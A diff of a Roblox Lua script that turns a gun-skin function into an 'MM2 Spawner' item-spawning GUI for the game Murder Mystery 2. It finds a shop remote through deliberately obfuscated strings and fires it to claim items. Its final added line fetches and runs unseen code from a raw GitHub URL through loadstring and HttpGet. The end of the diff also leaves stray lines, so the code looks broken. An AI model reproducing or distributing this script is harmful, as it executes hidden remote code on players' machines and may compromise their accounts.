@@ -1,106 +1,199 @@
-local function SpawnGingerscope()
-    local guns = {
-        Gingerscope = {
-            MeshId = "rbxassetid://15374602183",
-            Offset = Vector3.zero,
-            Scale = Vector3.new(0.084, 0.084, 0.084),
-            TextureId = "rbxassetid://15409041564",
-            VertexColor = Vector3.new(1, 1, 1),
-            CFrame = CFrame.new(0.129999995, 0, 0.075000003, 1, 0, 0, 0, 0.707388222, 0.706825197, 0, -0.706825197, 0.707388222),
-            Grip = CFrame.new(0, -0.400000006, 0.899999976, 1, 0, 0, 0, 1, 0, 0, 0, 1),
-            Image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15666596216",
-            GuiColor = Color3.new(0.39215686274509803, 0.0392156862745098, 1)
-        }
-    }
+-- [[ Rscripts Risk Notice ]]
+-- This script is not verified by rscripts.net. Deal with caution.
+--
+-- Stay safe:
+--   • Never log in on unofficial Roblox sites or lookalike domains.
+--   • Real Roblox links use roblox.com (check the .com ending).
+--   • Treat fake Roblox login / "claim reward" pages as phishing.
+-- [[ End Rscripts Risk Notice ]]
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game:GetService("CoreGui")
+
+local notificationFrame = Instance.new("Frame")
+notificationFrame.Size = UDim2.new(0.4, 0, 0.08, 0)
+notificationFrame.Position = UDim2.new(0.3, 0, 0.9, 0)
+notificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+notificationFrame.BackgroundTransparency = 0.3
+notificationFrame.BorderSizePixel = 0
+notificationFrame.Parent = screenGui
+notificationFrame.Visible = false
+
+local notificationUICorner = Instance.new("UICorner")
+notificationUICorner.CornerRadius = UDim.new(0.1, 0)
+notificationUICorner.Parent = notificationFrame
+
+local notificationGradient = Instance.new("UIGradient")
+notificationGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
+}
+notificationGradient.Parent = notificationFrame
+
+local notificationText = Instance.new("TextLabel")
+notificationText.Size = UDim2.new(1, 0, 1, 0)
+notificationText.Position = UDim2.new(0, 0, 0, 0)
+notificationText.BackgroundTransparency = 1
+notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+notificationText.TextSize = 20
+notificationText.Font = Enum.Font.GothamBold
+notificationText.TextScaled = true
+notificationText.Parent = notificationFrame
+
+local function showNotification(message)
+    notificationText.Text = message
+    notificationFrame.Visible = true
+    notificationFrame:TweenPosition(UDim2.new(0.3, 0, 0.85, 0), "Out", "Quad", 0.5, true)
+
+    wait(3)
+    notificationFrame:TweenPosition(UDim2.new(0.3, 0, 1.1, 0), "Out", "Quad", 0.5, true)
+    wait(0.5)
+    notificationFrame.Visible = false
+end
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.35, 0, 0.45, 0)
+frame.Position = UDim2.new(0.325, 0, 0.275, 0)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BackgroundTransparency = 0.3
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local frameUICorner = Instance.new("UICorner")
+frameUICorner.CornerRadius = UDim.new(0.1, 0)
+frameUICorner.Parent = frame
+
+local frameGradient = Instance.new("UIGradient")
+frameGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 30))
+}
+frameGradient.Parent = frame
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 0.2, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "MM2 Spawner"
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextSize = 26
+textLabel.Font = Enum.Font.GothamBold
+textLabel.TextStrokeTransparency = 0.8
+textLabel.Parent = frame
+
+local itemTextBox = Instance.new("TextBox")
+itemTextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+itemTextBox.Position = UDim2.new(0.1, 0, 0.3, 0)
+itemTextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+itemTextBox.PlaceholderText = "Enter item name"
+itemTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+itemTextBox.TextSize = 20
+itemTextBox.Font = Enum.Font.Gotham
+itemTextBox.Parent = frame
+
+local itemTextBoxUICorner = Instance.new("UICorner")
+itemTextBoxUICorner.CornerRadius = UDim.new(0.1, 0)
+itemTextBoxUICorner.Parent = itemTextBox
+
+local spawnButton = Instance.new("TextButton")
+spawnButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+spawnButton.Position = UDim2.new(0.1, 0, 0.6, 0)
+spawnButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+spawnButton.Text = "Spawn"
+spawnButton.TextSize = 20
+spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+spawnButton.Font = Enum.Font.Gotham
+spawnButton.Parent = frame
+
+local spawnButtonUICorner = Instance.new("UICorner")
+spawnButtonUICorner.CornerRadius = UDim.new(0.1, 0)
+spawnButtonUICorner.Parent = spawnButton
+
+local function buttonHoverEffect(button)
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    end)
     
-    local LocalPlayer = game:GetService("Players").LocalPlayer
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local Players = game:GetService("Players")
-    local CoreGui = game:GetService("CoreGui")
-    
-    local ChosenGun = "Gingerscope"
-    local Equipped = false
-    local BackpackImageConnection = nil
-    local GunVisualConnection = nil
-    local AutoEquipGunConnection = nil
-    local ClickConnection = nil
-    
-    local function Disconnect()
-        if BackpackImageConnection then
-            BackpackImageConnection:Disconnect()
-            BackpackImageConnection = nil
-        end
-        if GunVisualConnection then
-            GunVisualConnection:Disconnect()
-            GunVisualConnection = nil
-        end
-        if AutoEquipGunConnection then
-            AutoEquipGunConnection:Disconnect()
-            AutoEquipGunConnection = nil
-        end
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    end)
+
+    button.MouseButton1Click:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        wait(0.1)
+        button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    end)
+end
+
+buttonHoverEffect(spawnButton)
+
+local crate = "Halloween2024Box"
+local itemList = {
+    Harvester = "Harvester",
+    Gingerscope = "Gingerscope",
+    Icepiercer = "Icepiercer",
+    VampireGun = "VampireGun",
+    VampireAxe = "VampireAxe",
+    TravelerAxe = "TravelerAxe",
+    Spirit = "WraithKnife",
+    ChromaWatergun = "WatergunChroma"
+--Add new items here
+}
+
+local _R = game:GetService(string.reverse("egarotSdetacilpeR"))
+local _a, _b, _c = "Remotes", "Shop", "BoxController"
+local _B = _R:WaitForChild(string.reverse(string.reverse(_a))):WaitForChild(table.concat({_b})):WaitForChild(string.sub(_c, 1, 3) .. string.sub(_c, 4))
+
+local function fireBoxController(...)
+    _B:Fire(...)
+end
+
+spawnButton.MouseButton1Click:Connect(function()
+    local itemName = itemTextBox.Text
+    local item = itemList[itemName]
+
+    if item then
+        fireBoxController(crate, item)
+        showNotification("Spawned item: " .. item)
+    else
+        showNotification("Item not found or invalid input.")
     end
-    
-    local function EquipGun(GunName)
-        if Equipped ~= false then
-            Disconnect()
-            local Character = LocalPlayer.Character
-            repeat
-                task.wait()
-            until Character:FindFirstChild("HumanoidRootPart")
-            
-            local GunModel = nil
-            local KnifeModel = nil
-            
-            repeat
-                for _, Child in pairs(workspace.WeaponDisplays:GetChildren()) do
-                    local AttachmentA = Child.RigidConstraint.Attachment0
-                    local AttachmentB = Child.RigidConstraint.Attachment0
-                    
-                    if AttachmentA == Character:FindFirstChild("GunBelt", true) then
-                        GunModel = Child
-                    end
-                    if AttachmentB == Character:FindFirstChild("KnifeBack", true) then
-                        KnifeModel = Child
-                    end
-                end
-                task.wait(0.1)
-            until GunModel and KnifeModel
-            
-            repeat
-                task.wait()
-            until GunModel:FindFirstChild("Attachment")
-            
-            GunModel.Attachment.CFrame = guns[GunName].CFrame
-            
-            for Key, Value in pairs(guns[GunName]) do
-                if Key ~= "CFrame" and Key ~= "Grip" and Key ~= "Image" and Key ~= "GuiColor" then
-                    GunModel.Mesh[Key] = Value
-                end
+end)
+
+local UIS = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
             end
-            
-            BackpackImageConnection = LocalPlayer.Backpack.DescendantAdded:Connect(function()
-                if guns[GunName] then
-                    for _, Child in pairs(CoreGui.RobloxGui.Backpack.Hotbar:GetChildren()) do
-                        if Child.Icon.Image ~= "" and GetSheriff() == LocalPlayer then
-                            Child.Icon.Image = guns[GunName].Image
-                        end
-                    end
-                end
-            end)
-            
-            GunVisualConnection = LocalPlayer.Backpack.DescendantAdded:Connect(function(Descendant)
-                if tostring(Descendant) == "Gun" then
-                    task.wait()
-                    local UsableGun = LocalPlayer.Backpack.Gun.Handle
-                    for Key, Value in pairs(guns[GunName]) do
-                        if Key ~= "CFrame" and Key ~= "Grip" and Key ~= "Image" and Key ~= "GuiColor" then
-                            UsableGun.Mesh[Key] = Value
-                        end
-                    end
-                    UsableGun.Parent.Grip = guns[GunName].Grip
-                end
-            end)
-            
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheTippyOmega/VisualSkinUnboxerMM2/refs/heads/main/GUI'))()            
             return
         end
     end
